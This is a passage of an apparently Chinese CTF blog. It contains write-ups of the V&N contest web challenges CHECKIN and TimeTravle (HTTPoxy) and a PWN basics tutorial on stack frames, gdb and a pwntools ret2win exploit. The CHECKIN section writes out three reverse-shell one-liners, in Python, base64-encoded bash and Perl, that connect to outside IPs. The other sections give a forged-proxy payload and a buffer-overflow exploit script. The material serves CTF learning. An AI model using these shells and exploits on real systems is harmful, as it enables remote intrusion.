src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320174915348.png" alt></p><p>在后台隐藏的题目中找到了flag</p><p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320175042556.png" alt></p><p>参考资料：</p><blockquote><p><a href="https://www.colabug.com/2020/0204/6940556/" target="_blank" rel="noopener">https://www.colabug.com/2020/0204/6940556/</a></p></blockquote><h3 id="0x-02-CHECKIN"><a href="#0x-02-CHECKIN" class="headerlink" title="0x 02 CHECKIN"></a>0x 02 CHECKIN</h3><ul><li><p>考点</p><p>Linux 基本知识</p></li><li><p>解题过程</p></li></ul><ol><li>页面右键打开查看源代码进行审计</li></ol><p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320180352562.png" alt></p><p>shell路由通过传入参数可以进行命令执行，在每次执行命令前都会把 flag 文件删除且不带回显结果</p><ol start="2"><li>因为是python应用，先反弹一个shell到内网的一个靶机中</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">第一种</span><br><span class="line">python3 -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;174.1.34.205&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line"></span><br><span class="line">第二种</span><br><span class="line">echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3NC4wLjIyMi4yMDMvMTIzNCAwPiYxCg&#x3D;&#x3D;|base64 -d|bash</span><br><span class="line"></span><br><span class="line">第三种</span><br><span class="line">perl -MIO -e &#39;$p&#x3D;fork;exit,if($p);$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;174.0.222.203:1234&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320182713990.png" alt></p><p>这里引入文件描述符：</p><p><strong>什么是文件描述符：</strong>内核利用文件描述符来访问文件。文件描述符是非负整数。打开现存文件或新建文件时，内核会返回一个文件描述符。读写文件也需要使用文件描述符来指定待读写的文件。</p><p>例如Python中，当我们open()函数打开一个文件时便创建了一个文件描述符，而后对这个文件描述符使用read()函数便是读取文件描述符中的内容，close()函数用于关闭/销毁这个文件描述符。</p><p><strong>文件描述符储存在什么地方：</strong><code>/proc/&lt;pid&gt;/fd&lt;id&gt;</code></p><p>也就是说，我们可以通过cat进程中的fd来获取到文件描述符。相关知识点在高校运维挑战赛中也考到了。</p><p>利用<code>cat /proc/*/fd/*</code>读取文件缓存找到被移除的flag.txt，得到flag</p><p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320183213503.png" alt></p><h3 id="0x-03-TimeTravle"><a href="#0x-03-TimeTravle" class="headerlink" title="0x 03 TimeTravle"></a>0x 03 TimeTravle</h3><ul><li><p>考点</p><p>HTTPoxy漏洞（CVE-2016-5385）</p></li><li><p>解题过程</p></li></ul><ol><li>页面打开显示了源代码，进行审计</li></ol><p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320195204663.png" alt></p><p>传入参数flag，会请求一个 HTTPAPI 服务，那个服务返回 success 的话就执行程序读 flag。</p><p>传入参数file，就回去读这个文件。</p><p>传入参数phpinfo，就会执行 phpinfo。</p><ol start="2"><li>用返回包中可以知道服务器使用的是Nginx + PHP，查看phpinfo服务器是cgi模式，符合<a href="https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy</a> 所述，我们需要传入一个 Proxy头，使其产生一个 HTTP_PROXY 环境变量，这个环境变量再被程序里的 GuzzleHttp 使用，即可使流量走代理，控制返回的请求。</li><li>尝试进行文件读取<code>/start.sh</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env bash</span><br><span class="line"></span><br><span class="line">chmod +x &#x2F;readflag</span><br><span class="line">chmod +s &#x2F;readflag</span><br><span class="line">echo $FLAG &gt; &#x2F;flag &amp;&amp; export FLAG&#x3D;not_flag &amp;&amp; FLAG&#x3D;not_flag &amp;&amp; cd &#x2F;srv&#x2F;</span><br><span class="line"></span><br><span class="line">chmod 700 &#x2F;flag</span><br><span class="line"></span><br><span class="line">python3 &#x2F;srv&#x2F;app.py &amp;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">php-fpm &amp;</span><br><span class="line"></span><br><span class="line">service nginx start</span><br><span class="line"></span><br><span class="line">tail -F &#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p>开启了<code>php-fpm</code>，<code>http://127.0.0.1:5000/api/eligible</code>服务就是这个<code>/srv/app.py</code>提供的,读取<code>/srv/app.py</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">import datetime</span><br><span class="line">import json</span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;api&#x2F;eligible&#39;)</span><br><span class="line">def source():</span><br><span class="line">    current_year &#x3D; int(datetime.datetime.now().strftime(&quot;%Y&quot;))</span><br><span class="line">    if current_year &lt; 2050:</span><br><span class="line">        return json.dumps(&#123;&quot;success&quot;: False&#125;)</span><br><span class="line">    else:</span><br><span class="line">        return json.dumps(&#123;&quot;success&quot;: True&#125;)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app.run(host&#x3D;&#39;127.0.0.1&#39;)</span><br></pre></td></tr></table></figure><ol start="4"><li>方法一：构造一个response返回就可以了，参考一位师傅的payload：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.14.2</span><br><span class="line">Date: Sat, 29 Feb 2020 05:27:31 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;UTF-8</span><br><span class="line">Connection: Keep-alive</span><br><span class="line">Content-Length: 16</span><br><span class="line"></span><br><span class="line">&#123;&quot;success&quot;:true&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320194617008.png" alt></p><p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320194548045.png" alt></p><p>方法二：用SimpleHTTPServer模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DemoHttpServer</span><span class="params">(BaseHTTPRequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.send_response(<span class="number">200</span>, message=<span class="string">'OK'</span>)</span><br><span class="line">        self.send_header(<span class="string">'Content-Type'</span>, <span class="string">'application/json'</span>)</span><br><span class="line">        self.end_headers()</span><br><span class="line">        self.wfile.write(json.dumps(&#123;<span class="string">"success"</span>: <span class="literal">True</span>&#125;).encode())</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    server = HTTPServer((<span class="string">'0.0.0.0'</span>, <span class="number">1234</span>), DemoHttpServer)</span><br><span class="line">    print(<span class="string">'Server is running, user &lt;Ctrl+C&gt; to srop.'</span>)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure><p>方法三：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$arr = <span class="keyword">array</span>(<span class="string">"success"</span>=&gt;<span class="keyword">true</span>);</span><br><span class="line">header(<span class="string">"Content-Type:application/json"</span>);</span><br><span class="line"><span class="keyword">echo</span> json_encode($arr);</span><br></pre></td></tr></table></figure><p>当前目录启动<code>php -S 0:2333</code></p><p>参考资料：</p><blockquote><p><a href="https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy</a></p></blockquote><h3 id="0x-04-EasySpringMVC"><a href="#0x-04-EasySpringMVC" class="headerlink" title="0x 04 EasySpringMVC"></a>0x 04 EasySpringMVC</h3><p>待补上</p><p>参考资料：</p><blockquote><p><a href="https://blog.csdn.net/Leon_cx/article/details/81517603" target="_blank" rel="noopener">https://blog.csdn.net/Leon_cx/article/details/81517603</a></p><p><a href="https://blog.csdn.net/chasingin/article/details/104593868" target="_blank" rel="noopener">https://blog.csdn.net/chasingin/article/details/104593868</a></p><p><a href="https://www.zhaoj.in/read-6407.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6407.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctfwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUOJ </tag>
            
            <tag> V&amp;N招新公开赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN基础知识</title>
      <link href="/2020/03/20/PWN%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2020/03/20/PWN%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-栈帧的概念"><a href="#0x-01-栈帧的概念" class="headerlink" title="0x 01 栈帧的概念"></a>0x 01 栈帧的概念</h3><blockquote><p>从逻辑上讲，栈帧就是一个函数执行的环境：函数调用框架、函数参数、函数的局部变量、函数执行完后返回到哪里等等。栈是从高地址向低地址延伸的。每个函数的每次调用，都有它自己独立的一个栈帧，这个栈帧中维持着所需要的各种信息。</p><p>寄存器ebp指向当前的栈帧的底部（高地址），寄存器esp指向当前的栈帧的顶部（低地址）。</p></blockquote><p><img src="https://images2015.cnblogs.com/blog/1069650/201704/1069650-20170427115241365-545987088.png" alt="img"></p><p>注意：ebp指向当前位于系统栈最上边一个栈帧的底部，而不是系统栈的底部。严格说来，“栈帧底部”和“栈底”是不同的概念;ESP所指的栈帧顶部和系统栈的顶部是同一个位置。**</p><p>参考链接：<a href="https://www.cnblogs.com/33debug/p/6773059.html" target="_blank" rel="noopener">函数的调用过程（栈帧）</a></p><h3 id="0x-02-相关汇编指令"><a href="#0x-02-相关汇编指令" class="headerlink" title="0x 02 相关汇编指令"></a>0x 02 相关汇编指令</h3><p>关于dword ptr 指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dword   双字 就是四个字节</span><br><span class="line">ptr     pointer缩写 即指针</span><br><span class="line">[]里的数据是一个地址值，这个地址指向一个双字型数据</span><br><span class="line">比如mov eax, dword ptr [12345678]  把内存地址12345678中的双字型（32位）数据赋给eax</span><br></pre></td></tr></table></figure><p>关于CALL，RET和LEAVE指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CALL指令的步骤：首先是将返回地址（也就是call指令要执行时EIP的值）压入栈顶，然后是将程序跳转到当前调用的方法的起始地址。执行push和jump指令。</span><br><span class="line"></span><br><span class="line">RET指令则是将栈顶的返回地址弹出到EIP，然后按照EIP此时指示的指令地址继续执行程序。</span><br><span class="line"></span><br><span class="line">LEAVE指令是将栈指针指向帧指针，然后POP备份的原帧指针到%EBP。（恢复到调用的时候ebp和esp值）</span><br><span class="line"></span><br><span class="line">Leave等价于：</span><br><span class="line">movl %ebp %esp</span><br><span class="line">popl %ebp</span><br></pre></td></tr></table></figure><p>push   ebp //压入返回地址</p><p>lea指令 复制内存地址</p><h3 id="0x-03-相关寄存器"><a href="#0x-03-相关寄存器" class="headerlink" title="0x 03 相关寄存器"></a>0x 03 相关寄存器</h3><p>eip寄存器：用来存储CPU要读取指令的地址,CPU通过<em>EIP寄存器</em>读取即将要执行的指令。</p><h3 id="0x-04-GOT表和PLT表"><a href="#0x-04-GOT表和PLT表" class="headerlink" title="0x 04 GOT表和PLT表"></a>0x 04 GOT表和PLT表</h3><p>为了更好的用户体验和内存<em>C*</em>P<strong>U<em>的利用率，程序编译时会采用两种表进行辅助，一个为</em>P</strong>L<strong>T<em>表，一个为</em>G</strong>O<strong>T<em>表，</em>P</strong>L<strong>T<em>表可以称为内部函数表，</em>G</strong>O<strong>T<em>表为全局函数表（也可以说是动态函数表这是个人自称），这两个表是相对应的，什么叫做相对应呢，</em>P</strong>L<strong>T<em>表中的数据就是</em>G</strong>O*<em>T</em>表中的一个地址，可以理解为一定是一一对应的，如下图：</p><p><img src="https://img-blog.csdn.net/20170123151558845?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMTg2NjEyNTc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="img"></p><h3 id="0x-05-64位汇编参数传递"><a href="#0x-05-64位汇编参数传递" class="headerlink" title="0x 05 64位汇编参数传递"></a>0x 05 64位汇编参数传递</h3><p><img src="https://bbs.pediy.com/upload/attach/201902/827130_P7PCJ24ZK3TVPMA.png" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</span><br><span class="line"></span><br><span class="line">参数个数大于 7 个的时候</span><br><span class="line">H(a, b, c, d, e, f, g, h);</span><br><span class="line">a-&gt;%rdi, b-&gt;%rsi, c-&gt;%rdx, d-&gt;%rcx, e-&gt;%r8, f-&gt;%r9</span><br><span class="line">h-&gt;8(%esp)</span><br><span class="line">g-&gt;(%esp)</span><br><span class="line">call H</span><br><span class="line"></span><br><span class="line">write函数需要三个参数，需要rdi，rsi，rdx三个寄存器</span><br><span class="line">http:&#x2F;&#x2F;abcdxyzk.github.io&#x2F;blog&#x2F;2012&#x2F;11&#x2F;23&#x2F;assembly-args&#x2F;</span><br></pre></td></tr></table></figure><h3 id="0x-06-内存对齐"><a href="#0x-06-内存对齐" class="headerlink" title="0x 06 内存对齐"></a>0x 06 内存对齐</h3><p><img src="/2020/03/20/PWN%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20200119204051236.png" alt="image-20200119204051236"></p><ul><li>作用：减少CPU访问内存的次数</li><li>原因：</li></ul><p>1.平台原因(移植原因)：不是所有的硬件平台都能访问任意地址上的任意数据的；某些硬件平台只能在某些地址处取某些特定类型的数据，否则抛出硬件异常。<br>2.性能原因：数据结构(尤其是栈)应该尽可能地在自然边界上对齐。原因在于，为了访问未对齐的内存，处理器需要作两次内存访问；而对齐的内存访问仅需要一次访问。<br>参考资料： <a href="https://mp.weixin.qq.com/s?src=11&timestamp=1579437525&ver=2106&signature=nR5axh9kvfbbOyiJz7Xog*tdwlSkaLY5ecX7Rztxmt3AeBlxmpC2vgKCji6l6OBEoiKvO9K8Pscd27wxWv0oMZYrdmMCWYDIf6qsc*g2QAQ*n-XZqB*bgtAw2SKh28zs&new=1" target="_blank" rel="noopener">【底层原理】C/C++内存对齐详解</a>       </p><h3 id="0x-07-GDB调试命令"><a href="#0x-07-GDB调试命令" class="headerlink" title="0x 07 GDB调试命令"></a>0x 07 GDB调试命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">（gdb）help：查看命令帮助，具体命令查询在gdb中输入help + 命令,简写h</span><br><span class="line"></span><br><span class="line">（gdb）run：重新开始运行文件（run-text：加载文本文件，run-bin：加载二进制文件）,简写r</span><br><span class="line"></span><br><span class="line">（gdb）start：单步执行，运行程序，停在第一执行语句</span><br><span class="line"></span><br><span class="line">（gdb）list：查看原代码（list-n,从第n行开始查看代码。list+ 函数名：查看具体函数）,简写l</span><br><span class="line"></span><br><span class="line">（gdb）set：设置变量的值</span><br><span class="line"></span><br><span class="line">（gdb）next：单步调试（逐过程，函数直接执行）,简写n</span><br><span class="line"></span><br><span class="line">（gdb）step：单步调试（逐语句：跳入自定义函数内部执行）,简写s</span><br><span class="line"></span><br><span class="line">（gdb）backtrace：查看函数的调用的栈帧和层级关系,简写bt</span><br><span class="line"></span><br><span class="line">（gdb）frame：切换函数的栈帧,简写f</span><br><span class="line"></span><br><span class="line">（gdb）info：查看函数内部局部变量的数值,简写i</span><br><span class="line"></span><br><span class="line">（gdb）finish：结束当前函数，返回到函数调用点</span><br><span class="line"></span><br><span class="line">（gdb）continue：继续运行,简写c</span><br><span class="line"></span><br><span class="line">（gdb）print：打印值及地址,简写p</span><br><span class="line"></span><br><span class="line">（gdb）quit：退出gdb,简写q</span><br><span class="line"></span><br><span class="line">（gdb）break+num：在第num行设置断点,简写b</span><br><span class="line"></span><br><span class="line">（gdb）info breakpoints：查看当前设置的所有断点</span><br><span class="line"></span><br><span class="line">（gdb）delete breakpoints num：删除第num个断点,简写d</span><br><span class="line"></span><br><span class="line">（gdb）display：追踪查看具体变量值</span><br><span class="line"></span><br><span class="line">（gdb）undisplay：取消追踪观察变量</span><br><span class="line"></span><br><span class="line">（gdb）watch：被设置观察点的变量发生修改时，打印显示</span><br><span class="line"></span><br><span class="line">（gdb）i watch：显示观察点</span><br><span class="line"></span><br><span class="line">（gdb）enable breakpoints：启用断点</span><br><span class="line"></span><br><span class="line">（gdb）disable breakpoints：禁用断点</span><br><span class="line"></span><br><span class="line">（gdb）x：查看指定内存地址内容  x&#x2F;20xw 显示20个单元，16进制，4字节每单元</span><br><span class="line"> https:&#x2F;&#x2F;www.cnblogs.com&#x2F;redman274&#x2F;p&#x2F;12164753.html</span><br><span class="line"> 如果地址所指的是字符串，那么格式可以是s，如果地址是指令地址，那么格式可以是i</span><br><span class="line"> </span><br><span class="line">（gdb）run argv[1] argv[2]：调试时命令行传参</span><br><span class="line"></span><br><span class="line">（gdb）set follow-fork-mode child#Makefile项目管理：选择跟踪父子进程（fork()）</span><br><span class="line"></span><br><span class="line">gdb 中step next 与finish的区别</span><br><span class="line">step 就是单步执行，遇到子函数就进入并且继续单步执行；在其他调试其中相当于step-into命令，作用是移动到下一个可执行的代码行。如果当前行是一个函数调用，则调试器进入函数并停止在函数体的第一行。step可以帮助初步揭开代码位置的谜团，例如：函数调用和函数本身可能在不同的文件中。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">next 是在单步执行时，在函数内遇到子函数时不会进入子函数内单步执行，而是将子函数整个执行完再停止，也就是把子函数整个作为一步。在其他调试器中相当于step-over，作用是在同一个调用栈层中移动到下一个可执行的代码行。调试器不会进入函数体。如果当前行是函数的最后一行，则，next将进入下一个栈层，并在调用函数的下一行停止。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">finish就是但单步执行到子函数内时，用step out就可以执行完子函数余下部分，并返回到上一层函数。在其他调试器中相当于step-out，作用是在栈中前进到到下一层，并在调用函数的下一行停止。</span><br></pre></td></tr></table></figure><h3 id="0x-08-cyclic工具"><a href="#0x-08-cyclic工具" class="headerlink" title="0x 08 cyclic工具"></a>0x 08 cyclic工具</h3><p>使用pwntools里面的cyclic工具生成字符串和计算偏移</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@hw-virtual-machine:&#x2F;home&#x2F;hw&#x2F;桌面&#x2F;PWN# cyclic 200</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line"></span><br><span class="line">root@hw-virtual-machine:&#x2F;home&#x2F;hw&#x2F;桌面&#x2F;PWN# cyclic -l 0x62616164</span><br><span class="line">112</span><br></pre></td></tr></table></figure><h3 id="0x-09-简单实例"><a href="#0x-09-简单实例" class="headerlink" title="0x 09 简单实例"></a>0x 09 简单实例</h3><p>源代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">void exploit()</span><br><span class="line">&#123;</span><br><span class="line">    system(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line">void func()</span><br><span class="line">&#123;</span><br><span class="line">    char str[0x20];</span><br><span class="line">    read(0, str, 0x50);</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    func();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>func函数汇编</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function func:</span><br><span class="line">   0x080484b4 &lt;+0&gt;:push   ebp</span><br><span class="line">   0x080484b5 &lt;+1&gt;:mov    ebp,esp</span><br><span class="line">   0x080484b7 &lt;+3&gt;:sub    esp,0x38</span><br><span class="line">   0x080484ba &lt;+6&gt;:mov    eax,gs:0x14</span><br><span class="line">   0x080484c0 &lt;+12&gt;:mov    DWORD PTR [ebp-0xc],eax</span><br><span class="line">   0x080484c3 &lt;+15&gt;:xor    eax,eax</span><br><span class="line">   0x080484c5 &lt;+17&gt;:sub    esp,0x4</span><br><span class="line">   0x080484c8 &lt;+20&gt;:push   0x50   &#x2F;&#x2F;压入read函数的第三个参数</span><br><span class="line">   0x080484ca &lt;+22&gt;:lea    eax,[ebp-0x2c]   </span><br><span class="line">   0x080484cd &lt;+25&gt;:push   eax    &#x2F;&#x2F;压入read函数的第二个参数</span><br><span class="line">   0x080484ce &lt;+26&gt;:push   0x0    &#x2F;&#x2F;压入read函数的第一个参数</span><br><span class="line">   0x080484d0 &lt;+28&gt;:call   0x8048350 &lt;read@plt&gt;    &#x2F;&#x2F;调用plt表的</span><br><span class="line">   0x080484d5 &lt;+33&gt;:add    esp,0x10</span><br><span class="line">   0x080484d8 &lt;+36&gt;:nop</span><br><span class="line">   0x080484d9 &lt;+37&gt;:mov    eax,DWORD PTR [ebp-0xc]</span><br><span class="line">   0x080484dc &lt;+40&gt;:xor    eax,DWORD PTR gs:0x14</span><br><span class="line">   0x080484e3 &lt;+47&gt;:je     0x80484ea &lt;func+54&gt;</span><br><span class="line">   0x080484e5 &lt;+49&gt;:call   0x8048360 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   0x080484ea &lt;+54&gt;:leave  </span><br><span class="line">   0x080484eb &lt;+55&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">p &#x3D; process(&quot;.&#x2F;pwn1&quot;)</span><br><span class="line"></span><br><span class="line">offset &#x3D; 0x2c + 0x4</span><br><span class="line">payload &#x3D; &#39;a&#39;*offset + p32(0x0804849b)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>实例二：</p><p><img src="/2020/03/20/PWN%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20200117223344225.png" alt></p><p><img src="/2020/03/20/PWN%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20200117223446581.png" alt></p><p>汇编代码：</p><p>main函数中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040078c &lt;+145&gt;:lea    rax,[rbp-0x4]</span><br><span class="line">   0x0000000000400790 &lt;+149&gt;:mov    rsi,rax</span><br><span class="line">   0x0000000000400793 &lt;+152&gt;:mov    edi,0x400961</span><br><span class="line">   0x0000000000400798 &lt;+157&gt;:mov    eax,0x0</span><br><span class="line">   0x000000000040079d &lt;+162&gt;:call   0x4005d0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x00000000004007a2 &lt;+167&gt;:mov    